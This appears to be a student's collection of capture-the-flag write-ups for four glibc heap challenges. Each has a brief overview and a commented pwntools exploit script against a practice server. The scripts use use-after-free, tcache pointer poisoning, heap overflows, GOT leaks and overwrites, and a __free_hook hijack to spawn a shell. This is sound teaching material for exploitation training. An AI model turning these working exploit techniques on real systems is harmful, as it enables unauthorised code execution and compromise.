Ran out of time this week, so instead of "writeups" the explanation of the exploit code is within the code's comments

usemedontabuseme
===========================
Flag: FLAG{}

General overview of problems faced
-------------------------------------
The main issue here was just understanding how the heap worked. Given this is my first heap exploit I made zero progress until reading and researching enough. Once I understood the implication of UAF better and how glibc handles free/malloc in terms of chunk metadata, it became clear that I could leak heap addresses and in doing so can control the heap by changing the fwd pointers. By changing the fwd pointer to point within an existing chunk I could have overlapping chunks, allowing me to change previously unaccessible data that got reflected in the original chunk (due to the UAF vuln).

Script/Command used (Writeup)
------------------
```
from pwn import *

PROG_NAME = "./usemedontabuseme"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 7000

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
else:
    p = process(PROG_NAME)
    elf = p.elf

def create_custom(num, data):
	p.recvuntil("Choice: ")
	p.sendline("A")
	p.sendline(str(num))
	p.sendline(data)

def create(num):
	p.recvuntil("Choice: ")
	p.sendline("A")
	p.sendline(str(num))
	p.sendline(str(num)*8)

def view(num):
	p.recvuntil("Choice: ")
	p.sendline("D")
	p.sendline(str(num))
	p.recvuntil("Name: ")
	return p.recvline().rstrip()

def free(num):
	p.recvuntil("Choice: ")
	p.sendline("B")
	p.sendline(str(num))

def rename(num, to_write):
	p.recvuntil("Choice: ")
	p.sendline("C")
	p.sendline(str(num))
	p.sendline(to_write)

def hakk(num):
	p.recvuntil("Choice: ")
	p.sendline("H")
	p.sendline(str(num))

# use after free vulnerability
# win addr : 0x08048b7c

create(1)
create(2)
create(3)

free(2)
free(3)

# the first 4 bytes of chunk 3 (now free) will be a fwd pointer to chunk 2
# since we have UAF we can read this pointer and get a heap address
heap_addr = u32(view(3)[:4])

# chunk sizes are 0x20. the printed pointer is of chunk 2 so to get chunk 1 address, -0x20
# then add 0x8 to reach the address where 0x6447 should be in the (presumably) struct
target = heap_addr - 0x20 + 0x8

# change the fwd pointer to the address of chunk 1's 0x6447 data
rename(3, p32(target))

# create a new element which should reuse the free chunk 3
# next free chunk should be our target (since we changed the fwd pointer)
create(3)

# creation allows for writing 0x9 bytes (with null) instead of 0x8 like in rename
# we write the 0x6447 to pass the fake "canary" check, and then the win function to overwrite the function pointer
create_custom(4, p32(0x6447) + p32(0x08048b7c))

# then execute our overwritten function pointer
hakk(1)

p.interactive()
```

ezpz1
===========================
Flag: FLAG{}

General overview of problems faced
-------------------------------------
For me this was the easiest challenge, and I quickly noticed the flaw with the order that chunks were freed.

Script/Command used (Writeup)
------------------
```
from pwn import *

PROG_NAME = "./ezpz1"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 7001

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
else:
    p = process(PROG_NAME)
    elf = p.elf

def create(num):
    p.recvuntil("refresh): ")
    p.sendline("C")

def free(num):
    p.recvuntil("refresh): ")
    p.sendline("D")
    p.sendline(str(num))

def set(num, data):
    p.recvuntil("refresh): ")
    p.sendline("S")
    p.sendline(str(num))
    p.sendline(data)

def ask(num):
    p.recvuntil("refresh): ")
    p.sendline("A")
    p.sendline(str(num))

# win addr is 0x08048a5c

# each question entry has 2 malloc'ed chunks (size 0x20 each)
# first chunk starts with a function pointer (executed by ask) and ends with a pointer to the 2nd chunk (serving as a string pointer)
# second chunk stores string data which is intended to be printed by the function pointer

create(0)
free(0)

# the first chunk for a question is freed first, then the second string chunk
# this means in the bin, for first fit allocation, the second chunk will get malloc'ed first in future

create(1)

# so now question 0 uses chunk 1 and 2 respectively, and question 1 uses chunk 2 and 1 respectively

# by setting the string of q1, we write the win function address to the first chunk
# in relation to q0 this is overwriting the function pointer
set(1, p32(0x08048a5c))

# since theres a UAF vuln, we can still ask q0 although it was freed
# asking will trigger the function pointer which is now the win function
ask(0)

p.interactive()
```

ezpz2
===========================
Flag: FLAG{}

General overview of problems faced
-------------------------------------
My main issue with this challenge was trying to figure out how leak a libc address. The lectures mentioned that if you go down the chain of smallbin chunks you will eventually get a libc pointer (the arena address). So my initial plan was to fill up tcache, create new chunks and modify their sizes so that they went into the smallbin instead of the fastbin, and then leak libc. Clearly this is very convoluted. After researching more about heap exploits and looking at past writeups, I realised the much simpler method of just reading from the GOT, and from there the rest was relatively straightforward.

Script/Command used (Writeup)
------------------
```
from pwn import *

PROG_NAME = "./ezpz2"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 7002
REMOTE_LIBC = "./libc6_2.27-3ubuntu1_i386.so"
LOCAL_LIBC = "/lib/i386-linux-gnu/libc.so.6"

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
    libc = ELF(REMOTE_LIBC)
else:
    p = process(PROG_NAME)
    elf = p.elf
    libc = ELF(LOCAL_LIBC)

def create(num):
	p.recvuntil("refresh): ")
	p.sendline("C")

def free(num):
	p.recvuntil("refresh): ")
	p.sendline("D")
	p.sendline(str(num))

def set(num, data):
	p.recvuntil("refresh): ")
	p.sendline("S")
	p.sendline(str(num))
	p.sendline(data)
	print(num, data)

def ask(num):
	p.recvuntil("refresh): ")
	p.sendline("A")
	p.sendline(str(num))
	p.recvuntil("I have the answer perhaps: '")
	return p.recvuntil("'", drop=True)

# this function will abuse the heap overflow
def gen_addr_payload(addr):
	overflow = b'A'*0x1c #fills it's own allocated string space with 'A's
	overflow += p32(0x21) #preserve next question's, chunk 1 metadata
	overflow += b'A'*0x18 #fill the next question's chunk 1
	overflow += p32(addr) #overwrite next question's string pointer
	overflow += p32(0x21) #preserve next questions, chunk 2 metadata (due to \n overflow)
	return overflow


# the order of freeing has been swapped to avoid the previous exploit
# also the function pointer is removed
# but now there is a heap overflow of 0x60 bytes in set_question()

create(0)
create(1)
create(2)
create(3)
set(0, gen_addr_payload(elf.got['fgets']))
fgets_addr = u32(ask(1)[:4])
print(hex(fgets_addr))

'''
identifying libc
puts is at offset b40
fgets is at fb0

according to libc.nullbyte.cat, the libc version is libc6_2.27-3ubuntu1_i386
'''

# calculate libc base and /bin/sh address
libc_base = fgets_addr - libc.symbols['fgets']
libc.address = libc_base
binsh_addr = next(libc.search(b'/bin/sh'))

# overwrite q3's string pointer with /bin/sh pointer
set(2, gen_addr_payload(binsh_addr))
# overwrite q1's string pointer with the free's GOT address
set(0, gen_addr_payload(elf.got['free']))
# write to q1, overwriting the free GOT entry with the system libc address
# there's a trailing \n which breaks the following GOT entries after free,
# so we preserve them
set(1, p32(libc.symbols['system'])
	  +p32(libc.symbols['getchar'])
	  +p32(libc.symbols['fgets']))

# q3's string is now /bin/sh, so this will execute system("/bin/sh")
free(3)

p.interactive()
```

notezpz
===========================
Flag: FLAG{}

General overview of problems faced
-------------------------------------
There were a few challenges I faced for this one:
 - Leaking: With PIE enabled and return of the print_question function pointer, leaking data became more delicate. I couldn't go trigger happy with the heap overflow else I would overwrite the function pointer and not be able to read anything. Eventually I realised that instead of trying to leak the function pointer, I can first leak a heap address (due to UAF) from the fwd pointer of free chunks. After that I can control the fwd pointer so I can then read from a chunk that has the function pointer rather than just the chunks used to store strings. Once I had the function pointer I could go trigger happy with the heap overflows and leak whatever I wanted (like libc address).
 - Popping a shell: No win function. full RELRO stopping me from writing to the GOT. My first idea was to overwrite the "free_hook" with a one gadget. Unfortunately I couldn't ever get a working one gadget. Not sure if that was intentional or I was just doing something wrong. Then I remembered that there was still a function pointer. So instead I could overwrite the "free_hook" with system(). Then I free a question which contains a /bin/sh string (which I create onto the heap) and the pointer to the string later gets passed to system, giving me the shell. And it worked.

Script/Command used (Writeup)
------------------
```
from pwn import *

PROG_NAME = "./notezpz"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 7003
REMOTE_LIBC = "./libc6_2.27-3ubuntu1_i386.so"
LOCAL_LIBC = "/lib/i386-linux-gnu/libc.so.6"

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
    libc = ELF(REMOTE_LIBC)
else:
    p = process(PROG_NAME)
    elf = p.elf
    libc = ELF(LOCAL_LIBC)

def create(num):
	p.recvuntil("refresh): ")
	p.sendline("C")

def free(num):
	p.recvuntil("refresh): ")
	p.sendline("D")
	p.sendline(str(num))

def set(num, data):
	p.recvuntil("refresh): ")
	p.sendline("S")
	p.sendline(str(num))
	p.sendline(data)
	print(num, data)

def ask(num):
	p.recvuntil("refresh): ")
	p.sendline("A")
	p.sendline(str(num))
	p.recvuntil("I have the answer perhaps: '")
	data = p.recvuntil("'", drop=True).rstrip()
	return data[:-1] if data[-1]=="'" else data

# same as the gen_addr_payload from ezpz1 solution
# but this time the first chunk of a question has a function
# pointer so we need to write that in, to allow for reading data
def gen_addr_payload(fn_ptr_addr, arbitrary_addr):
	overflow = b'A'*0x1c
	overflow += p32(0x21)
	overflow += p32(fn_ptr_addr)
	overflow += b'A'*0x14
	overflow += p32(arbitrary_addr)
	overflow += p32(0x21)
	return overflow

'''
full protections
function pointer is back
heap overflow is still there
'''

create(0)
create(1)
create(2)
create(3)
free(1)
free(2)
create(4) # same addr as q2

# this leaves the fwd pointer of q2 but resets the function pointer to print_question
# note that this fwd pointer should point to the first chunk of q1
heap_chunk_1_of_1 = u32(ask(4)[:4])
free(4)

# now that q4 (well q2) is free, we want to overwrite its fwd pointer to the first chunk of any question,
# so we can read the print_question function address
# q3 is untarnished so far, so that will have the function pointer
heap_chunk_1_of_3 = heap_chunk_1_of_1 + (0x20*2*2) # each question has 2 0x20 chunks
overflow = b'A'*0x1c # fill q1's 2nd chunk
overflow += p32(0x21) # preserve q2's 1st chunk metadata
overflow += p32(heap_chunk_1_of_3) # overwrite q2's fwd pointer in chunk 1
set(1, overflow)

# since we overwrote the fwd pointer of q2's first chunk to point to q3's first chunk
# the first newly allocated chunk for q5 will be q2's first chunk
# but the 2nd newly allocated chunk for q5 will be q3's first chunk (which has the function pointer)
create(5) # same addr as q2 and q4

# leak the print_question function address and overcome PIE
print_question_addr = u32(ask(5)[:4])
binary_base = print_question_addr - elf.symbols['print_question']
elf.address = binary_base

# leak a libc address by reading from the GOT's fgets entry
set(1, gen_addr_payload(print_question_addr, elf.got['fgets']))
fgets_addr = u32(ask(5)[:4])
libc_base = fgets_addr - libc.symbols['fgets']
libc.address = libc_base

# since there's full RELRO we can't write to the GOT
# so instead we overwrite the __free_hook (used by free()) with system()
set(1, gen_addr_payload(print_question_addr, libc.symbols['__free_hook']))
set(5, p32(libc.symbols['system'])) # remember q2 and q5 point to same memory

# q0 is untarnished, so we can set it's string to /bin/sh
set(0, "/bin/sh\x00")

# since the string (2nd chunk) of a question is freed before the first chunk
# free will be called with the address of our /bin/sh string first
# since __free_hook was overwritten this has the effect of system("/bin/sh")
free(0)

p.interactive()
```